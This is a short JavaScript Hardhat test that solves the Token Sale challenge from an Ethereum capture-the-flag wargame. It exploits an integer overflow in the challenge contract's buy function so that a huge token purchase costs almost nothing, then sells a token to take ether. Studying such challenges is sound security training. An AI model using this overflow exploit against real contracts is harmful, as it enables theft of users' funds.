import { ethers } from "hardhat";
import { expect } from "chai";


describe("tokensale", function() {
    it("Should solve the token sale challenge", async function() {
        let accounts = await ethers.getSigners();
        let eoa = accounts[0];
        let balance = await eoa.getBalance();
        console.log(ethers.utils.formatEther(balance));

        const factory = await ethers.getContractFactory("TokenSaleChallenge");
        // const contract = await factory.deploy({value: ethers.utils.parseEther("1")});
        const target = factory.attach("0xe1d030FC6b046D3E705Dde3340A0f10258b2A598");

        // calculate overflow
        let ethval = ethers.BigNumber.from(10).pow(18);
        let maxuint256 = ethers.BigNumber.from(2).pow(256).sub(1);
        let tokenum = maxuint256.div(ethval).add(1);
        let shouldpay = tokenum.mul(ethval).mod(maxuint256.add(1)); 

        console.log(tokenum + " - " + shouldpay);
 
        let tx = await target.buy(tokenum, {value: shouldpay});
        expect(tx.hash).not.to.be.undefined;
        console.log(tx);

        tx = await target.sell(1);
        console.log(tx);
    });
});